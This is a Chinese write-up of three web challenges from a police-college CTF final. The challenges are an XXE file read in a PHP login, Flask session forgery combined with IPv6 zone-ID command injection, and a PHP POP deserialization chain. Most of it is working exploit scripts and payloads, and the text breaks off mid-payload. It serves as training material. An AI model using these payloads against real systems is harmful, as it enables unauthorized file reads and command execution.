---
title: 浙江警察学院第九届信息网络安全竞赛决赛-wp
url: https://mp.weixin.qq.com/s/0rMcHIvr3aTlLPXaamB3tw
source: Doonsec's feed
date: 2026-06-26
fetch_date: 2026-06-27T05:45:58.060781
---

# 浙江警察学院第九届信息网络安全竞赛决赛-wp

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5cibmxIQ97TXqpRC5AlBZMPaRLiau2pcFtBxIjXBctibhycFmceflWsicL1u4GdPHJQzPIMhhyeEfPVnzZc7csEAMUGt2cwPRDJZqY/0?wx_fmt=jpeg)

# 浙江警察学院第九届信息网络安全竞赛决赛-wp

原创

玄网安全 oPis
玄网安全 oPis

玄网安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 浙江警察学院第九届信息网络安全竞赛决赛-wp

## `上班摸鱼-写😀`

## 正版wp以官方为主-比赛题目在【ctfplus】可复现

# login.php XXE

## 概要

这题的核心是 `login.php` 对用户提交的 XML 直接启用了外部实体解析，形成 XXE。利用外部实体读取 `/flag`，再借助错误分支中的 `$username.$username` 回显，即可直接拿到 flag。

## 解题过程

### Step 1: 确认 XXE 注入点

附件 `login.php` 的关键代码如下：

```
libxml_disable_entity_loader(false);
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
```

这里有两个关键点：

* `libxml_disable_entity_loader(false)` 允许实体加载
* `LIBXML_NOENT | LIBXML_DTDLOAD` 会解析外部实体

后续程序从 XML 中读取：

```
$username = $creds->username;
$password = $creds->password;
```

并进入分支：

```
if ($username != 'admin'){
    $res = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username.$username);
}
```

因此只要让 `username` 变成 `/flag` 的文件内容，并保证它不等于 `admin`，响应里就会把 flag 拼接回显两次。

### Step 2: 发送恶意 XML 并提取 flag

首页前端会向 `/login.php` 发送 `application/xml`，所以我们直接 POST 一份带外部实体的 XML：

```
import re
import urllib.request

URL = "http://80-7680e940-a0a7-44e4-96c2-3791d9762d2c.challenge.ctfplus.cn/login.php"
XML = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>
<root><username>&xxe;</username><password>wrong</password></root>
""".encode()

def main():
    req = urllib.request.Request(
        URL,
        data=XML,
        headers={"Content-Type": "application/xml"},
        method="POST",
    )
    body = urllib.request.urlopen(req).read().decode("utf-8", "ignore")
    match = re.search(r"ZJPCTF\\{[^}]+\\}", body)
    if not match:
        raise SystemExit("flag not found")
    print(match.group(0))

if __name__ == "__main__":
    main()
```

运行结果：

```
ZJPCTF{bac914dd-8089-426e-afce-90bc0daa57a9}
```

## Flag

```
ZJPCTF{bac914dd-8089-426e-afce-90bc0daa57a9}
```

# addr — 我就ping一下怎么了

## Summary

Flask Web 应用存在两个漏洞的组合利用：**已知 secret\_key 伪造 session cookie** 绕过管理员认证，以及 **IPv6 Zone ID 注入** 穿越 `ip_address()` 校验实现任意命令执行，最终读取 `/flag`。

## Solution

### Step 1: 源码审计

访问容器地址，页面是一个 "系统管理控制台"，提供 Ping 功能但提示"只有管理员可以使用此工具"。附件泄露了 `app.py` 源码，关键逻辑如下：

```
app.secret_key = 'secret_key_changed_in_container'

@app.route('/set_user_session', methods=['POST'])
def set_user_session():
    username = request.form.get('username', '').strip()
    if username.lower() == 'admin':          # ← 小写比较，阻止 'admin'
        flash("禁止操作：不允许设置 'admin' 用户名！")
        return redirect(url_for('index'))
    session['user'] = username
    ...

@app.route('/test', methods=['POST'])
def ping():
    target = request.form.get('target', '')
    current_user = session.get('user')
    if current_user and current_user.upper() != 'ADMIN':  # ← 大写比较
        return render_template(...)
    ...
    target = ip_address(target).compressed   # ← 输入校验
    command = f'ping {param} 4 {target}'
    result = subprocess.run(command, shell=True, ...)  # ← 命令注入点
```

**漏洞点：**

1. **认证绕过**：设置器用 `.lower()` 阻止 `admin`，但管理检查用 `.upper()` 判断 `ADMIN`。然而直接通过表单无法设置 `ADMIN`（因为 `'ADMIN'.lower() == 'admin'` 会被拦截）。但 `secret_key` 是硬编码的弱密钥，可以直接伪造 session cookie。
2. **命令注入**：`ip_address()` 校验后 `.compressed` 输出直接拼入 `shell=True` 的命令。而 `ip_address()` 接受带 **Zone ID** 的 IPv6 地址（如 `fe80::1%eth0`），Zone ID 中的 shell 元字符会被保留。
3. **字符限制**：`ip_address()` 拒绝 `/` 和 `%`，需要用 shell 变量（如 `$(echo $PATH|cut -c1)`）或 `cd ..` 绕过路径限制。

### Step 2: 构造 Exploit

```
from itsdangerous import URLSafeTimedSerializer
import urllib.request, urllib.parse, re

# --- 1. 伪造管理员 Session Cookie ---
secret = 'secret_key_changed_in_container'
serializer = URLSafeTimedSerializer(
    secret_key=secret,
    salt='cookie-session',          # Flask 默认 salt
    signer_kwargs={'key_derivation': 'hmac'}
)
cookie = serializer.dumps({'user': 'ADMIN'})

base_url = 'http://5000-xxxxx.challenge.ctfplus.cn'  # 替换为实际容器地址

# --- 2. IPv6 Zone ID 命令注入 ---
# ip_address("fe80::1%;cd ..;cat flag").compressed = "fe80::1%;cd ..;cat flag"
# 实际执行: ping -c 4 fe80::1%;cd ..;cat flag
#           ping 失败 → 但 cat flag 成功输出

payload = "fe80::1%;cd ..;cat flag"
data = urllib.parse.urlencode({'target': payload}).encode()
req = urllib.request.Request(f'{base_url}/test', data=data, method='POST')
req.add_header('Cookie', f'session={cookie}')
req.add_header('Content-Type', 'application/x-www-form-urlencoded')

resp = urllib.request.urlopen(req, timeout=15)
html = resp.read().decode()
result = re.search(r'<pre>(.*?)</pre>', html, re.DOTALL)
print(result.group(1).strip() if result else "NO OUTPUT")
```

**关键 Payload 选择：**

| Payload | 效果 |
| --- | --- |
| `fe80::1%;id` | 验证命令注入可行（返回 `uid=0(root)`） |
| `fe80::1%;cd ..;ls` | 发现根目录下存在 `flag` 文件 |
| `fe80::1%;cd ..;cat flag` | 读取 flag |

`/` 被 `ip_address()` 拒绝，所以用 `cd ..` 从 `/app` 回到 `/` 再 `cat flag`，避免在 payload 中使用斜杠。

### Step 3: 获取 Flag

```
ZJPCTF{8e866207-e2a8-4a9e-b685-764dfa0d2efe}
```

## Flag

```
ZJPCTF{8e866207-e2a8-4a9e-b685-764dfa0d2efe}
```

# PHP POP 反序列化

```
<?php
highlight_file(__FILE__);
class yiyi{
    public $Do;
    public $You;
    public $love;
    public $web;

    public function __invoke(){
        echo "迈进新手村了，接下来往哪走呢"."<br>";
        eval($this->web);
    }

    public function __wakeup(){
        $this->web=$this->love;
    }

    public function __destruct(){
        die($this->You->execurise=$this->Do);
    }
}

class t0mcater{
    private $execurise;
    public $lead;
    public $hansome;

    public function __set($name,$value){
        echo $this->lead;
    }

    public function __get($args){
        if(is_readable("/flag")){
            echo file_get_contents("/flag");
        }
        else{
            echo "签到也不带这么签的啊"."<br>";
            if ($this->execurise=="man!"){
                echo "胜利就在眼前"."<br>";
                if(isset($this->hansome->lover)){
                    phpinfo();
                }
            }
            else{
                echo($this->execurise);
                echo "搞什么啊，别犯困"."<br>";
            }
        }
    }
}

class jungle{
    public $girl;
    public $friend;

    public function __toString(){
        return "心中有信仰，脚下有力量"."<br>".$this->girl->abc;
    }

    public function __call($args1,$args2){
        $func=$this->friend;
        $func();
    }
}

class ZJPC{
    private $lover;
    public $forever;

    public function __isset($args){
        return $this->forever->nononon();
    }
}

$web=$_GET['web'];
if (isset($web)){
    unserialize(base64_decode($web));
    throw new Exception("None");
}else{
    echo("你真的是学web的么");
}
?>
Warning: Undefined array key "web" in /var/www/html/index.php on line 75
你真的是学web的么
```

## 概要

这题首页直接泄露了 PHP 源码，核心漏洞是 `unserialize(base64_decode($_GET['web']))`。利用链是 `yiyi::__destruct() -> t0mcater::__set() -> jungle::__toString() -> t0mcater::__get()`，最终触发 `file_get_contents("/flag")` 读取 flag。

## 解题过程

### Step 1: 确认可达 sink 与 POP 链

源码里最关键的 sink 在：

```
public function __get($args){
    if(is_readable("/flag")){
        echo file_get_contents("/flag");
    }
}
```

可用链条如下：

* `yiyi::__destruct()` 会执行 `$this->You->execurise = $this->Do`
* 因为 `t0mcater::$execurise` 是私有属性，类外赋值会触发 `t0mcater::__set()`
* `__set()` 中 `echo $this->lead`，若 `lead` 是 `jungle` 对象，则触发 `jungle::__toString()`
* `__toString()` 中访问 `$this->girl->abc`，若 `girl` 是另一个 `t0mcater` 对象，则触发 `t0mcater::__get()`
* `__get()` 直接读取 `/flag`

这里有一个关键点：**不需要额外构造 fast-destruct**。因为题目代码是直接执行：

```
unserialize(base64_decode($web));
throw new Exception("None");
```

`unserialize()` 的返回值没有保存到变量中，所以临时对象会在该语句结束后立刻析构，`__destruct()` 会在 `throw` 之前触发。

### Step 2: 构造 payload 并读取 flag

下面这份脚本直接向题目地址发送 payload，并从响应中提取 flag：

```
import re
import urllib.parse
import urllib.request

URL = "http://80-35170111-a30d-4449-b413-61d7e98c1656.challenge.ctfplus.cn/"
PAYLOAD = (
    "Tzo0OiJ5aXlpIjo0OntzOjI6IkRvIjtzOjA6IiI7czozOiJZb3UiO086ODoidDBtY2F0ZXIiOjM6e3M6"
    "MTk6IgB0MG1jYXRlcgBleGVjdXJpc2UiO047czo0OiJsZ...